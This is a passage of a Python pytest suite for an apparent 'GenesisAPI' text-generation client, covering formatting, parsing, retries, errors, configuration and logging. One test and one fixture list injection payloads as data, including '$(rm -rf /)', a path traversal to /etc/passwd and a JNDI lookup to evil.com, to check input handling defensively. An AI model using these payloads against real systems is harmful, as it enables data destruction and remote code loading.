        Verify that the prompt formatting function correctly processes minimum and maximum allowed values for max_tokens and temperature.
        """
        # Test minimum values
        formatted = format_genesis_prompt(
            prompt="A",
            max_tokens=1,
            temperature=0.0
        )
        assert formatted["prompt"] == "A"
        assert formatted["max_tokens"] == 1
        assert formatted["temperature"] == 0.0
        
        # Test maximum values
        formatted = format_genesis_prompt(
            prompt="Test prompt",
            max_tokens=4096,
            temperature=1.0
        )
        assert formatted["max_tokens"] == 4096
        assert formatted["temperature"] == 1.0

    def test_parse_genesis_response_with_optional_fields(self):
        """
        Verifies that `parse_genesis_response` correctly parses responses containing only required fields as well as those with additional optional or extra fields.
        """
        # Response with minimal required fields
        minimal_response = {
            "id": "minimal_id",
            "text": "Minimal response",
            "model": "genesis-v1"
        }
        
        result = parse_genesis_response(minimal_response)
        assert result.id == "minimal_id"
        assert result.text == "Minimal response"
        assert result.model == "genesis-v1"
        assert result.created is None
        assert result.usage == {}
        
        # Response with all fields
        complete_response = {
            "id": "complete_id",
            "text": "Complete response",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 10, "completion_tokens": 20},
            "metadata": {"custom_field": "value"}
        }
        
        result = parse_genesis_response(complete_response)
        assert result.created == 1234567890
        assert result.usage["prompt_tokens"] == 10
        assert hasattr(result, 'metadata') or True  # Handle extra fields gracefully

    @pytest.mark.asyncio
    async def test_retry_with_jitter_and_backoff_variations(self):
        """
        Test that retry logic with exponential backoff and jitter retries on transient errors and succeeds after multiple failures.
        
        Verifies the function is retried the correct number of times and that the backoff mechanism is triggered as expected.
        """
        mock_func = AsyncMock()
        
        # Test with increasing failure then success
        mock_func.side_effect = [
            GenesisAPIServerError("Server error 1"),
            GenesisAPIServerError("Server error 2"),
            GenesisAPIServerError("Server error 3"),
            "Success after multiple retries"
        ]
        
        with patch('asyncio.sleep') as mock_sleep:
            result = await retry_with_exponential_backoff(mock_func, max_retries=4)
            assert result == "Success after multiple retries"
            assert mock_func.call_count == 4
            # Verify exponential backoff was called
            assert mock_sleep.call_count == 3

    def test_genesis_request_immutability_and_copying(self):
        """
        Test that GenesisRequest objects are immutable and that modifying a dictionary copy does not affect the original instance.
        
        Ensures that changes to a dictionary representation of a GenesisRequest do not alter the original, and that a new instance created from the modified dictionary reflects only the intended updates.
        """
        original_request = GenesisRequest(
            prompt="Original prompt",
            model="genesis-v1",
            max_tokens=100,
            temperature=0.7
        )
        
        # Test that modifying dict doesn't affect original
        request_dict = original_request.to_dict()
        request_dict["prompt"] = "Modified prompt"
        
        assert original_request.prompt == "Original prompt"  # Should be unchanged
        
        # Test creating new request from modified dict
        modified_request = GenesisRequest.from_dict(request_dict)
        assert modified_request.prompt == "Modified prompt"
        assert original_request.prompt == "Original prompt"

    def test_genesis_response_timestamp_handling(self):
        """
        Tests that the `GenesisResponse` preserves the `created` timestamp and allows correct conversion to a UTC-aware `datetime` object.
        """
        current_timestamp = int(datetime.now(timezone.utc).timestamp())
        
        response = GenesisResponse(
            id="timestamp_test_id",
            text="Timestamp test",
            model="genesis-v1",
            created=current_timestamp,
            usage={"prompt_tokens": 5, "completion_tokens": 10}
        )
        
        # Test timestamp is preserved correctly
        assert response.created == current_timestamp
        
        # Test converting to datetime if needed
        response_datetime = datetime.fromtimestamp(response.created, tz=timezone.utc)
        assert isinstance(response_datetime, datetime)

    @pytest.mark.asyncio
    async def test_error_recovery_and_graceful_degradation(self):
        """
        Test that the API client raises a `GenesisAPIServerError` with preserved error details when the service is partially unavailable, verifying graceful degradation and error recovery.
        """
        genesis_api = GenesisAPI(api_key=self.api_key, base_url=self.base_url)
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            # Test partial service availability
            mock_post.return_value.__aenter__.return_value.status = 503
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(
                return_value={"error": "Service partially unavailable", "details": "Model temporarily down"}
            )
            
            with pytest.raises(GenesisAPIServerError) as exc_info:
                await genesis_api.generate_text("Test graceful degradation")
            
            assert "Service partially unavailable" in str(exc_info.value)

    def test_exception_hierarchy_and_inheritance(self):
        """
        Verify that all custom GenesisAPI exceptions inherit from both GenesisAPIError and Exception.
        """
        # Test that all custom exceptions inherit from GenesisAPIError
        auth_error = GenesisAPIAuthenticationError("Auth test")
        rate_limit_error = GenesisAPIRateLimitError("Rate limit test")
        server_error = GenesisAPIServerError("Server test")
        timeout_error = GenesisAPITimeoutError("Timeout test")
        
        assert isinstance(auth_error, GenesisAPIError)
        assert isinstance(rate_limit_error, GenesisAPIError)
        assert isinstance(server_error, GenesisAPIError)
        assert isinstance(timeout_error, GenesisAPIError)
        
        # Test that they're all Exception subclasses
        assert isinstance(auth_error, Exception)
        assert isinstance(rate_limit_error, Exception)
        assert isinstance(server_error, Exception)
        assert isinstance(timeout_error, Exception)

    @pytest.mark.asyncio
    async def test_request_cancellation_handling(self):
        """
        Test that cancelling an in-progress text generation request raises asyncio.CancelledError and does not leave unfinished tasks.
        """
        genesis_api = GenesisAPI(api_key=self.api_key, base_url=self.base_url)
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            # Simulate a long-running request that gets cancelled
            async def slow_request(*args, **kwargs):
                """
                Simulates a delayed asynchronous request and returns a mock response object.
                
                Returns:
                    MagicMock: A mock object representing the response.
                """
                await asyncio.sleep(10)  # Simulate slow request
                return MagicMock()
            
            mock_post.side_effect = slow_request
            
            # Start request and cancel it quickly
            task = asyncio.create_task(genesis_api.generate_text("Long running prompt"))
            await asyncio.sleep(0.1)  # Let it start
            task.cancel()
            
            with pytest.raises(asyncio.CancelledError):
                await task

    @pytest.mark.asyncio
    async def test_malformed_response_structure_variants(self):
        """
        Test that GenesisAPI raises GenesisAPIError for various malformed API response structures.
        
        This test verifies that missing, empty, or None values in required response fields result in proper error handling.
        """
        genesis_api = GenesisAPI(api_key=self.api_key, base_url=self.base_url)
        
        malformed_responses = [
            {"text": "Missing id and model"},
            {"id": "test", "model": "genesis-v1"},  # Missing text
            {"id": "test", "text": "test", "model": None},  # Null model
            {"id": "", "text": "test", "model": "genesis-v1"},  # Empty id
            {"id": "test", "text": "", "model": "genesis-v1"},  # Empty text
            {"id": "test", "text": "test", "model": "genesis-v1", "usage": None},  # Null usage
        ]
        
        for response_data in malformed_responses:
            with patch('aiohttp.ClientSession.post') as mock_post:
                mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=response_data)
                mock_post.return_value.__aenter__.return_value.status = 200
                
                with pytest.raises(GenesisAPIError):
                    await genesis_api.generate_text("Test malformed response")

    def test_configuration_validation_comprehensive(self):
        """
        Verifies that GenesisAPI raises ValueError for invalid configuration parameters such as negative or zero timeouts, negative max_retries, and malformed or missing base URLs.
        """
        # Test invalid timeout values
        with pytest.raises(ValueError):
            GenesisAPI(api_key=self.api_key, base_url=self.base_url, timeout=-1)
        
        with pytest.raises(ValueError):
            GenesisAPI(api_key=self.api_key, base_url=self.base_url, timeout=0)
        
        # Test invalid max_retries values
        with pytest.raises(ValueError):
            GenesisAPI(api_key=self.api_key, base_url=self.base_url, max_retries=-1)
        
        # Test URL validation
        invalid_urls = [
            "not_a_url",
            "ftp://invalid.com",
            "http://",
            "https://",
            "",
            None
        ]
        
        for url in invalid_urls:
            with pytest.raises(ValueError):
                GenesisAPI(api_key=self.api_key, base_url=url)

    @pytest.mark.asyncio
    async def test_response_size_limits_and_handling(self):
        """
        Test that the API client correctly handles and parses extremely large response payloads.
        
        Verifies that responses containing very large text fields (such as 1MB of data) are received and processed without errors or truncation.
        """
        genesis_api = GenesisAPI(api_key=self.api_key, base_url=self.base_url)
        
        # Simulate extremely large response
        huge_text = "x" * 1000000  # 1MB of text
        
        mock_response = {
            "id": "huge_response_id",
            "text": huge_text,
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 10, "completion_tokens": 1000000}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            # Should handle large responses gracefully
            result = await genesis_api.generate_text("Generate huge response")
            assert len(result.text) == 1000000


class TestGenesisAPISecurityAndValidation:
    """Security and validation focused tests."""
    
    def test_input_sanitization_and_injection_prevention(self):
        """
        Tests that prompt formatting does not alter potentially malicious input and that API key validation correctly rejects injection attempts or unsafe values.
        """
        potentially_malicious_inputs = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "$(rm -rf /)",
            "{{7*7}}",
            "${jndi:ldap://evil.com/a}",
            "\x00\x01\x02",  # Null bytes and control characters
        ]
        
        for malicious_input in potentially_malicious_inputs:
            # Should not raise exceptions during formatting
            formatted = format_genesis_prompt(malicious_input)
            assert formatted["prompt"] == malicious_input  # Should be preserved as-is
            
            # API key validation should reject malicious content
            assert validate_api_key(malicious_input) == False

    def test_rate_limiting_headers_parsing(self):
        """
        Verifies that rate limiting headers are parsed correctly and that `GenesisAPIRateLimitError` is raised when appropriate headers are present in the response.
        """
        rate_limit_scenarios = [
            (429, {"X-RateLimit-Remaining": "0", "X-RateLimit-Reset": "1234567890"}),
            (429, {"Retry-After": "60"}),
            (429, {"X-RateLimit-Limit": "1000", "X-RateLimit-Window": "3600"}),
        ]
        
        for status_code, headers in rate_limit_scenarios:
            # Test that rate limit error includes header information
            with pytest.raises(GenesisAPIRateLimitError):
                handle_genesis_error(status_code, {"error": "Rate limited"})

    @pytest.mark.asyncio
    async def test_ssl_and_certificate_validation(self):
        """
        Tests that SSL/TLS certificate validation errors during text generation raise a GenesisAPIError.
        """
        genesis_api = GenesisAPI(api_key="test_key", base_url="https://api.genesis.example.com")
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            # Simulate SSL certificate error
            mock_post.side_effect = aiohttp.ClientSSLError("SSL certificate verification failed")
            
            with pytest.raises(GenesisAPIError):
                await genesis_api.generate_text("Test SSL validation")


class TestGenesisAPIObservabilityAndDebugging:
    """Tests for observability, logging, and debugging features."""
    
    @pytest.mark.asyncio
    async def test_request_response_logging(self):
        """
        Tests that request and response details are logged during text generation, ensuring observability for debugging.
        """
        genesis_api = GenesisAPI(api_key="test_key", base_url="https://api.genesis.example.com")
        
        mock_response = {
            "id": "logged_id",
            "text": "Logged response",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 5, "completion_tokens": 10}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            with patch('logging.getLogger') as mock_logger:
                logger_instance = MagicMock()
                mock_logger.return_value = logger_instance
                
                await genesis_api.generate_text("Test logging")
                
                # Verify that appropriate log calls were made
                assert logger_instance.debug.called or logger_instance.info.called

    def test_error_context_preservation(self):
        """
        Tests that exceptions raised by `handle_genesis_error` contain sufficient error context in their messages for debugging.
        """
        error_scenarios = [
            (401, {"error": "Invalid API key", "error_code": "AUTH_001"}),
            (429, {"error": "Rate limit exceeded", "retry_after": 60}),
            (500, {"error": "Internal server error", "trace_id": "abc123"}),
        ]
        
        for status_code, error_data in error_scenarios:
            try:
                handle_genesis_error(status_code, error_data)
                assert False, "Should have raised an exception"
            except GenesisAPIError as e:
                # Verify error message contains useful debugging information
                error_message = str(e)
                assert "error" in error_message.lower()

    @pytest.mark.asyncio
    async def test_performance_metrics_collection(self):
        """
        Verifies that performance metrics, including request duration and token usage, are accurately collected during a text generation API call.
        """
        genesis_api = GenesisAPI(api_key="test_key", base_url="https://api.genesis.example.com")
        
        mock_response = {
            "id": "metrics_id",
            "text": "Metrics response",
            "model": "genesis-v1",
            "created": 1234567890,
            "usage": {"prompt_tokens": 10, "completion_tokens": 20}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            start_time = datetime.now()
            result = await genesis_api.generate_text("Collect metrics")
            end_time = datetime.now()
            
            # Verify timing metrics can be calculated
            duration = (end_time - start_time).total_seconds()
            assert duration >= 0
            assert result.usage["prompt_tokens"] == 10
            assert result.usage["completion_tokens"] == 20


# Additional fixtures for the new tests
@pytest.fixture
def malformed_response_data():
    """
    Return a list of dictionaries representing malformed API responses for testing error handling in response parsing.
    
    Returns:
        list: Malformed response dictionaries simulating empty, incomplete, null, or incorrectly typed fields.
    """
    return [
        {},  # Empty response
        {"id": "test"},  # Missing required fields
        {"text": None},  # Null values
        {"id": "test", "text": "test", "model": "genesis-v1", "usage": "invalid"},  # Invalid usage type
    ]


@pytest.fixture
def security_test_inputs():
    """
    Return a list of strings simulating common security threat inputs for testing purposes.
    
    The returned list includes examples of SQL injection, cross-site scripting (XSS), path traversal, command injection, template injection, and LDAP injection payloads.
    """
    return [
        "'; DROP TABLE users; --",
        "<script>alert('xss')</script>",
        "../../etc/passwd",
        "$(rm -rf /)",
        "{{7*7}}",
        "${jndi:ldap://evil.com/a}",
    ]


@pytest.fixture
def performance_test_config():
    """
    Return configuration parameters for performance tests, such as batch size, response time threshold, memory usage limit, and number of concurrent requests.
    
    Returns:
        dict: A dictionary containing performance test configuration values.
    """
    return {
        "large_batch_size": 100,
        "response_time_threshold": 5.0,
        "memory_threshold_mb": 100,
        "concurrent_requests": 20
    }


# Parameterized tests for comprehensive coverage
@pytest.mark.parametrize("invalid_temp", [-0.1, 1.1, 2.0, -1.0, 1.5])
def test_temperature_validation_parameterized(invalid_temp):
    """
    Tests that providing an invalid temperature value to `format_genesis_prompt` raises a ValueError.
    
    Parameters:
        invalid_temp: A temperature value outside the valid range for prompt formatting.
    """
    with pytest.raises(ValueError):
        format_genesis_prompt("Test prompt", temperature=invalid_temp)


@pytest.mark.parametrize("invalid_tokens", [-1, 0, 10000, -100])
def test_max_tokens_validation_parameterized(invalid_tokens):
    """
    Test that `format_genesis_prompt` raises a ValueError for invalid `max_tokens` values.
    
    Parameters:
        invalid_tokens: An invalid value to be used for the `max_tokens` parameter.
    """
    with pytest.raises(ValueError):
        format_genesis_prompt("Test prompt", max_tokens=invalid_tokens)


@pytest.mark.parametrize("status_code,expected_exception", [
    (400, GenesisAPIError),
    (401, GenesisAPIAuthenticationError),
    (403, GenesisAPIAuthenticationError),
    (404, GenesisAPIError),
    (429, GenesisAPIRateLimitError),
    (500, GenesisAPIServerError),
    (502, GenesisAPIServerError),
    (503, GenesisAPIServerError),
])
def test_error_handling_parameterized(status_code, expected_exception):
    """
    Test that `handle_genesis_error` raises the correct exception for a given HTTP status code.
    
    Parameters:
        status_code (int): HTTP status code to simulate.
        expected_exception (Exception): Exception type expected to be raised for the status code.
    """
    with pytest.raises(expected_exception):
        handle_genesis_error(status_code, {"error": f"Error {status_code}"})
